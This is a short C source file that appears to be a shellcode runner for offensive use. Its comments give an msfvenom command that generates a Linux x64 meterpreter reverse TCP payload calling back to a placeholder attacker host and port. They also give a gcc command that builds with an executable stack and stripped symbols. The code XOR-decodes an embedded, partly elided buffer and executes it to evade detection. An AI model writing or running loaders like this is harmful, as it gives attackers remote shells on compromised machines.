#include <stdio.h>
#include <stdlib.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp -e x64/zutto_dekiru lhost=VAR_ATTACKER_HOST lport=VAR_ATTACKER_PORT -f c
// gcc -z execstack -s runner.c -o runner

typedef int(*shellcode_t)();

int main(int argc, char ** argv) {

    char xor_key = 'X';
    unsigned char buf[] = "\xc\x10[...]\x1a\x8";

    int arraysize = (int) sizeof(buf); for (int i=0; i < arraysize - 1; i++) {
        buf[i] = buf[i] ^ xor_key;
    }

    shellcode_t ret = (shellcode_t)buf;
    ret();
}